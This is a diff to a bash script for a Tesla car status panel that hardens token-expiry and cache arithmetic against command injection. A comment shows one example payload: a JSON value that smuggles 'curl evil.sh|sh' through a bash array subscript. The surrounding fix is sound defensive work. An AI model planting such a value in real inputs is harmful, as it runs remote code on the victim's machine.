@@ -108,6 +108,30 @@ mkdir -p "$CONFIG_DIR" "$CACHE_DIR/tiles" "$CACHE_DIR/places"
 
 now() { date +%s; }
 
+# Everything that reaches an arithmetic context goes through here first.
+#
+# Bash does not treat $(( )) as a sum over strings: it re-reads the *contents*
+# of every name it finds there and evaluates those as arithmetic in turn, and
+# an array subscript met along the way is a command substitution. So a token
+# response answering `"expires_in": "a[$(curl evil.sh|sh)]+3600"` runs the
+# command and still hands back a plausible hour, which is the part that makes
+# it worth doing. Tesla's own answers are as untrusted as any other here: a
+# token response is exactly what anyone able to answer for that host would
+# forge.
+#
+# Only plain digits get through. Anything else, empty included, is not a
+# duration and gets the caller's default instead. The length cap keeps the
+# result inside a signed 64-bit sum and rules out the absurd; the 10# strips a
+# leading zero that would otherwise be read as octal.
+number_or() {
+  local value="$1" fallback="$2"
+  case "$value" in
+    ''|*[!0-9]*) printf '%s' "$fallback"; return 0 ;;
+  esac
+  [ "${#value}" -le 12 ] || { printf '%s' "$fallback"; return 0; }
+  printf '%s' "$((10#$value))"
+}
+
 # ------------------------------------------------------------------- fixture
 
 # A canned reading, for working on the panel without waiting for the car to do
@@ -161,8 +185,9 @@ access_token() {
   local token expires
   token=$(read_first_line "$CONFIG_DIR/access-token" 2>/dev/null) || token=""
   expires=$(read_first_line "$CONFIG_DIR/access-token-expires" 2>/dev/null) || expires=0
+  expires=$(number_or "$expires" 0)
 
-  if [ -n "$token" ] && [ "$expires" -gt "$(( $(now) + 60 ))" ] 2>/dev/null; then
+  if [ -n "$token" ] && [ "$expires" -gt "$(( $(now) + 60 ))" ]; then
     printf '%s' "$token"; return 0
   fi
 
@@ -190,7 +215,7 @@ mint_access_token() {
   token=$(printf '%s' "$response" | jq -r '.access_token // empty' 2>/dev/null)
   [ -n "$token" ] || return 1
 
-  expires_in=$(printf '%s' "$response" | jq -r '.expires_in // 28800' 2>/dev/null)
+  expires_in=$(number_or "$(printf '%s' "$response" | jq -r '.expires_in // empty' 2>/dev/null)" 28800)
   new_refresh=$(printf '%s' "$response" | jq -r '.refresh_token // empty' 2>/dev/null)
 
   printf '%s\n' "$token" | write_private "$CONFIG_DIR/access-token"
@@ -253,7 +278,7 @@ EOF
 
   printf '%s\n' "$refresh" | write_private "$CONFIG_DIR/refresh-token"
   printf '%s\n' "$(printf '%s' "$response" | jq -r '.access_token')" | write_private "$CONFIG_DIR/access-token"
-  printf '%s\n' "$(( $(now) + $(printf '%s' "$response" | jq -r '.expires_in // 28800') ))" | write_private "$CONFIG_DIR/access-token-expires"
+  printf '%s\n' "$(( $(now) + $(number_or "$(printf '%s' "$response" | jq -r '.expires_in // empty' 2>/dev/null)" 28800) ))" | write_private "$CONFIG_DIR/access-token-expires"
 
   printf '\nSigned in. The token is in %s and nothing else needs doing.\n' "$CONFIG_DIR/refresh-token"
 }
@@ -516,14 +541,14 @@ cmd_car() {
   # asking it anything during that window is what stops it dropping off.
   if [ "$FORCE" -ne 1 ] && [ -n "$cached" ]; then
     local age driving charging throttle
-    age=$(( $(now) - $(printf '%s' "$cached" | jq -r '.at // 0') ))
+    age=$(( $(now) - $(number_or "$(printf '%s' "$cached" | jq -r '.at // empty' 2>/dev/null)" 0) ))
     driving=$(printf '%s' "$cached" | jq -r '.driving // false')
     charging=$(printf '%s' "$cached" | jq -r '.charging // "Unknown"')
 
     # Both exceptions are the same argument: the car is being held awake by
     # something that is not us, so a reading costs nothing it was not already
     # spending. Everything else waits out the park throttle.
-    throttle=$PARK_THROTTLE
+    throttle=$(number_or "$PARK_THROTTLE" 900)
     [ "$charging" = "Charging" ] && throttle=$CHARGE_THROTTLE
     [ "$driving" = "true" ] && throttle=$DRIVE_THROTTLE
 
